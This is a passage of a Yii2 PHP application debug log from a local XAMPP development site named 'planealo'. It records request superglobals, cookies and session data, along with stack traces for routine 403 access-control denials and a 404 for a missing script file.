    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/assignment/view?id=1'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58688'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a680ec9513'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a680ec9513'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a680ec9513'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629711.4668
    'REQUEST_TIME' => 1769629711
]
2026-01-28 15:49:03 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:49:02 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a682e0a9fc'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/role/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58697'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a682e0a9fc'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a682e0a9fc'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a682e0a9fc'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629742.6561
    'REQUEST_TIME' => 1769629742
]
2026-01-28 15:49:09 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:49:08 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a6832ee90d'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/role/update?id=superusuario'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58696'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a6832ee90d'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a6832ee90d'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a6832ee90d'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629748.925
    'REQUEST_TIME' => 1769629748
]
2026-01-28 15:49:19 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:49:18 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a683dcc61b'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/role/view?id=superusuario'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58704'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a683dcc61b'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a683dcc61b'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a683dcc61b'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629758.8304
    'REQUEST_TIME' => 1769629758
]
2026-01-28 16:14:38 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "js/escuela-selector.js". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('js/escuela-sele...', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 16:14:37 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_REFERER' => 'http://planealo.local/atletas/atletas-registro/create'
